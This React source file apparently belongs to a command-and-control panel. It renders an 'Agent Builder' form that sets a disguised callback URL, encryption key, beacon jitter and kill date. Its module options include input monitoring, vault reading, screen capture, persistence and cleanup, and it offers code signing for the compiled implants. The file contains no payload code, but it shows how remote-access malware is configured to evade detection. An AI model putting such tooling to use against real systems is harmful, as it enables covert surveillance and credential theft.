import React, { useState, useEffect, useRef } from 'react';
import { api } from '../api';

const MODULES = [
  { id: 'terminal', label: 'Terminal Session' },
  { id: 'storage', label: 'Storage Browser' },
  { id: 'task_viewer', label: 'Task Viewer' },
  { id: 'display', label: 'Display Capture' },
  { id: 'input_monitor', label: 'Input Monitor' },
  { id: 'vault_reader', label: 'Vault Reader' },
  { id: 'config_store', label: 'Config Store' },
  { id: 'boot_entries', label: 'Boot Entries' },
  { id: 'service_manager', label: 'Service Manager' },
  { id: 'tunnel', label: 'Network Relay' },
  { id: 'package_loader', label: 'Package Loader' },
  { id: 'cleanup', label: 'Cleanup' },
  { id: 'network_scan', label: 'Network Scan' },
  { id: 'clipboard', label: 'Clipboard' },
];

const STATUS_LABELS = {
  queued: 'QUEUED',
  in_progress: 'IN PROGRESS',
  completed: 'COMPLETED',
  failed: 'FAILED',
};

const STATUS_COLORS = {
  queued: 'var(--yellow, #e5c07b)',
  in_progress: 'var(--blue, #61afef)',
  completed: 'var(--green)',
  failed: 'var(--red)',
};

export default function Builder() {
  const [form, setForm] = useState({
    server_url: 'https://cdn.example.com:443',
    aes_key: '',
    sleep_seconds: 5,
    jitter_percent: 20,
    kill_date: 0,
    work_hours: '',
    target_os: 'windows',
    target_arch: 'x86_64',
    modules: MODULES.map(m => m.id),
    output_format: 'exe',
    sign_binary: false,
  });
  const [activeBuild, setActiveBuild] = useState(null);
  const [building, setBuilding] = useState(false);
  const [buildHistory, setBuildHistory] = useState([]);
  const pollRef = useRef(null);

  // Load build history on mount
  useEffect(() => {
    loadHistory();
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  const loadHistory = async () => {
    try {
      const history = await api.builderHistory();
      setBuildHistory(history || []);
    } catch (e) {}
  };

  const generateKey = () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    setForm({...form, aes_key: hex});
  };

  const toggleModule = (modId) => {
    if (form.modules.includes(modId)) {
      setForm({...form, modules: form.modules.filter(m => m !== modId)});
    } else {
      setForm({...form, modules: [...form.modules, modId]});
    }
  };

  const startPolling = (buildId) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const status = await api.buildStatus(buildId);
        setActiveBuild(status);
        if (status.status === 'completed' || status.status === 'failed') {
          clearInterval(pollRef.current);
          pollRef.current = null;
          loadHistory();
        }
      } catch (e) {
        clearInterval(pollRef.current);
        pollRef.current = null;
      }
    }, 3000);
  };

  const build = async () => {
    setBuilding(true);
    setActiveBuild(null);
    try {
      // Convert kill_date from date string to unix timestamp if needed
      let killDate = form.kill_date;
      if (typeof killDate === 'string' && killDate) {
        killDate = Math.floor(new Date(killDate).getTime() / 1000);
      }

      // Build work_hours string from form
      let workHours = form.work_hours;

      const payload = {
        ...form,
        kill_date: killDate || 0,
        work_hours: workHours || '',
      };

      const res = await api.buildAgent(payload);
      setActiveBuild({ build_id: res.build_id, status: 'queued' });
      startPolling(res.build_id);
    } catch (err) {
      setActiveBuild({ status: 'failed', error: err.message });
    }
    setBuilding(false);
  };

  const downloadBuild = (buildId) => {
    api.downloadBuild(buildId);
  };

  const progressPercent = activeBuild
    ? activeBuild.status === 'completed' ? 100
    : activeBuild.status === 'in_progress' ? 60
    : activeBuild.status === 'queued' ? 20
    : 0
    : 0;

  return (
    <div>
      <div className="page-title">// BUILDER</div>

      {/* Active Build Progress */}
      {activeBuild && (
        <div className="panel" style={{ marginBottom: 16 }}>
          <div className="panel-header">Build Progress</div>
          <div className="panel-body">
            <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 12 }}>
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)' }}>
                BUILD ID:
              </span>
              <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--green)' }}>
                {activeBuild.build_id || '—'}
              </span>
              <span style={{
                fontFamily: 'var(--font-mono)',
                fontSize: 10,
                padding: '2px 8px',
                background: STATUS_COLORS[activeBuild.status] || 'var(--text-muted)',
                color: '#000',
                fontWeight: 700,
              }}>
                {STATUS_LABELS[activeBuild.status] || activeBuild.status?.toUpperCase()}
              </span>
            </div>

            {/* Progress Bar */}
            <div style={{
              height: 4,
              background: 'var(--border)',
              borderRadius: 2,
              overflow: 'hidden',
              marginBottom: 12,
            }}>
              <div style={{
                height: '100%',
                width: progressPercent + '%',
                background: STATUS_COLORS[activeBuild.status] || 'var(--green)',
                transition: 'width 0.5s ease',
                animation: activeBuild.status === 'in_progress' ? 'pulse 1.5s ease-in-out infinite' : 'none',
              }} />
            </div>

            {activeBuild.error && (
              <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--red)', marginBottom: 8 }}>
                ✕ {activeBuild.error}
              </div>
            )}

            {activeBuild.status === 'completed' && (
              <button className="btn btn-green" style={{ fontSize: 11, padding: '8px 24px' }}
                onClick={() => downloadBuild(activeBuild.build_id)}>
                ⬇ DOWNLOAD BINARY
              </button>
            )}
          </div>
        </div>
      )}

      <div className="panel">
        <div className="panel-header">Agent Builder</div>
        <div className="panel-body" style={{ maxWidth: 800 }}>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Server URL</label>
              <input type="text" className="form-input" value={form.server_url} onChange={e => setForm({...form, server_url: e.target.value})} />
            </div>
            <div className="form-group">
              <label className="form-label">AES-256 Key (hex)</label>
              <div style={{ display: 'flex', gap: 8 }}>
                <input type="text" className="form-input" value={form.aes_key} onChange={e => setForm({...form, aes_key: e.target.value})} style={{ color: 'var(--green)', fontFamily: 'var(--font-mono)', fontSize: 10 }} />
                <button className="btn btn-sm" onClick={generateKey}>GEN</button>
              </div>
            </div>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Sleep (seconds)</label>
              <input type="number" className="form-input" value={form.sleep_seconds} onChange={e => setForm({...form, sleep_seconds: parseInt(e.target.value) || 0})} />
            </div>
            <div className="form-group">
              <label className="form-label">Jitter (%)</label>
              <input type="number" className="form-input" value={form.jitter_percent} onChange={e => setForm({...form, jitter_percent: parseInt(e.target.value) || 0})} />
            </div>
          </div>
          <div className="form-row">
            <div className="form-group">
              <label className="form-label">Kill Date (optional, unix timestamp)</label>
              <input type="number" className="form-input" value={form.kill_date || ''} onChange={e => setForm({...form, kill_date: parseInt(e.target.value) || 0})} placeholder="0 = disabled" />
            </div>
            <div className="form-group">
              <label className="form-label">Working Hours (optional, e.g. 8-18)</label>
              <input type="text" className="form-input" value={form.work_hours} onChange={e => setForm({...form, work_hours: e.target.value})} placeholder="Empty = always active" />
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Target OS</label>
            <div className="radio-group">
              {['windows','linux','macos'].map(os => (
                <span key={os} className={`radio-item ${form.target_os === os ? 'selected' : ''}`} onClick={() => setForm({...form, target_os: os})}>{os.toUpperCase()}</span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Target Architecture</label>
            <div className="radio-group">
              {['x86_64','aarch64'].map(arch => (
                <span key={arch} className={`radio-item ${form.target_arch === arch ? 'selected' : ''}`} onClick={() => setForm({...form, target_arch: arch})}>{arch.toUpperCase()}</span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Modules</label>
            <div className="checkbox-group">
              {MODULES.map(mod => (
                <span key={mod.id} className={`checkbox-item ${form.modules.includes(mod.id) ? 'checked' : ''}`} onClick={() => toggleModule(mod.id)}>
                  {form.modules.includes(mod.id) ? '✓ ' : ''}{mod.label}
                </span>
              ))}
            </div>
          </div>

          <div className="form-group">
            <label className="form-label">Output Format</label>
            <div className="radio-group">
              {['exe','dll'].map(fmt => (
                <span key={fmt} className={`radio-item ${form.output_format === fmt ? 'selected' : ''}`} onClick={() => setForm({...form, output_format: fmt})}>{fmt.toUpperCase()}</span>
              ))}
            </div>
          </div>

          {/* CODE SIGNING */}
          <div className="form-group" style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
            <label className="form-label">Code Signing (Azure Trusted Signing)</label>
            <div className="radio-group">
              <span className={`radio-item ${!form.sign_binary ? 'selected' : ''}`} onClick={() => setForm({...form, sign_binary: false})}>DISABLED</span>
              <span className={`radio-item ${form.sign_binary ? 'selected' : ''}`} onClick={() => setForm({...form, sign_binary: true})}>ENABLED</span>
            </div>
          </div>

          {form.sign_binary && (
            <div style={{ marginTop: 12, padding: 12, border: '1px solid var(--border)', background: 'var(--surface)', fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)' }}>
              <span style={{ color: 'var(--yellow, #e5c07b)' }}>⚠</span> Azure credentials are configured in <strong style={{ color: 'var(--text-sec)' }}>Settings → Builder</strong>.
              <br />
              <span style={{ color: 'var(--text-muted)', fontSize: 10 }}>Azure secrets must also be added as GitHub repository secrets.</span>
            </div>
          )}

          <div style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
            <button className="btn btn-green" style={{ fontSize: 12, padding: '12px 32px' }} onClick={build} disabled={building}>
              {building ? 'DISPATCHING...' : 'BUILD AGENT'}
            </button>
          </div>
        </div>
      </div>

      {/* Build History */}
      <div className="panel" style={{ marginTop: 16 }}>
        <div className="panel-header">Build History</div>
        <div className="panel-body" style={{ padding: 0 }}>
          {buildHistory.length === 0 ? (
            <div style={{ padding: 16, fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)' }}>
              No builds yet.
            </div>
          ) : (
            <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'var(--font-mono)', fontSize: 11 }}>
              <thead>
                <tr style={{ borderBottom: '1px solid var(--border)' }}>
                  <th style={thStyle}>BUILD ID</th>
                  <th style={thStyle}>STATUS</th>
                  <th style={thStyle}>TARGET</th>
                  <th style={thStyle}>CREATED</th>
                  <th style={thStyle}>ACTIONS</th>
                </tr>
              </thead>
              <tbody>
                {buildHistory.map(b => {
                  let config = {};
                  try { config = JSON.parse(b.config_json || '{}'); } catch(e) {}
                  return (
                    <tr key={b.id} style={{ borderBottom: '1px solid var(--border)' }}>
                      <td style={tdStyle}>
                        <span style={{ color: 'var(--green)' }}>{b.id}</span>
                      </td>
                      <td style={tdStyle}>
                        <span style={{
                          padding: '1px 6px',
                          fontSize: 10,
                          fontWeight: 700,
                          background: STATUS_COLORS[b.status] || 'var(--text-muted)',
                          color: '#000',
                        }}>
                          {STATUS_LABELS[b.status] || b.status?.toUpperCase()}
                        </span>
                      </td>
                      <td style={tdStyle}>
                        <span style={{ color: 'var(--text-sec)' }}>
                          {config.target_os || '?'}/{config.target_arch || '?'}
                        </span>
                      </td>
                      <td style={tdStyle}>
                        <span style={{ color: 'var(--text-muted)' }}>
                          {b.created_at ? new Date(b.created_at + 'Z').toLocaleString() : '—'}
                        </span>
                      </td>
                      <td style={tdStyle}>
                        {b.status === 'completed' && (
                          <button className="btn btn-sm" style={{ fontSize: 10 }}
                            onClick={() => downloadBuild(b.id)}>
                            DOWNLOAD
                          </button>
                        )}
                        {b.error && (
                          <span style={{ color: 'var(--red)', fontSize: 10 }} title={b.error}>
                            ✕ Error
                          </span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>
      </div>

      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
}

const thStyle = {
  textAlign: 'left',
  padding: '8px 12px',
  color: 'var(--text-muted)',
  fontWeight: 400,
  fontSize: 10,
};

const tdStyle = {
  padding: '8px 12px',
  color: 'var(--text-sec)',
};
